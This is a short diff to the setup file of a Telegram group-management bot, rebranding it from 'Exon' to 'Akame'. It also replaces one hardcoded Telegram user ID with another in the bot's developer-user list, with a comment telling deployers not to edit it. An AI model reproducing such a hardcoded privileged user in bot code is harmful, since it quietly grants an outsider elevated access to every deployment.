@@ -286,7 +286,7 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1452219013)  # no need to edit add your & enjoy
+DEV_USERS.add(5813471129)  # no need to edit add your & enjoy
 
 REDIS = StrictRedis.from_url(REDIS_URL, decode_responses=True)
 
@@ -324,7 +324,7 @@ print(
 print("[Exon]: ᴛᴇʟᴇɢʀᴀᴘʜ ɪɴsᴛᴀʟʟɪɴɢ")
 telegraph = Telegraph()
 print("[EXON ]: ᴛᴇʟᴇɢʀᴀᴘʜ ᴀᴄᴄᴏᴜɴᴛ ᴄʀᴇᴀᴛɪɴɢ")
-telegraph.create_account(short_name="Exon")
+telegraph.create_account(short_name="Akame")
 # updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
 
 
@@ -344,7 +344,7 @@ pgram = Client(
     api_hash=API_HASH,
     bot_token=TOKEN,
 )
-print("[EXON ]: ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ ᴇxᴏɴ sᴇʀᴠᴇʀ")
+print("[EXON ]: ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ ᴀᴋᴀᴍᴇ sᴇʀᴠᴇʀ")
 mongodb = MongoClient(MONGO_DB_URL, 27017)[MONGO_DB]
 motor = motor_asyncio.AsyncIOMotorClient(MONGO_DB_URL)
 db = motor[MONGO_DB]
